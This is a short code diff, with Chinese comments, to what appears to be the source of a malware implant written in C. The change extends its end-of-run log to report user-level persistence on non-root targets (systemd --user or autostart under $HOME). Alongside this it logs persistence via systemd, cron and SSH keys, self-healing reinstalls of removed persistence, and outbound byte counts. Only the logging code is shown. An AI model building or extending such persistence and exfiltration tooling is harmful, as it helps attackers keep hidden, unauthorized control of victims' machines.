@@ -353,14 +353,18 @@ int main(int argc, char **argv)
     }
 
     fprintf(stderr,
-            "[INFO] 结束: batches=%u frames=%u bytes_out=%llu persist_rc=%d "
+            "[INFO] 结束: batches=%u frames=%u bytes_out=%llu persist_rc=%d persist_user=%d "
             "methods=systemd:%d,cron:%d,sshkey:%d "
             "rechecks=%u heals=%u bin=%s\n",
             st.batches, st.frames, (unsigned long long)st.bytes_out,
-            st.persist_rc,
+            st.persist_rc, st.persist_user,
             st.methods[0], st.methods[1], st.methods[2],
             st.persist_rechecks, st.persist_heals,
             st.bin_path[0] ? st.bin_path : "(none)");
+    if (st.persist_user)
+        fprintf(stderr, "[INFO] 用户级驻留生效（非 root 目标）：落点在 $HOME 下"
+                        " systemd --user / autostart\n");
+
     /* 自检装回过驻留要单独留痕：这是"有人动过这台机器"的信号，
      * 混在 persist_rc 里看不出来（persist_rc 只反映启动那一次）。 */
     if (st.persist_heals)
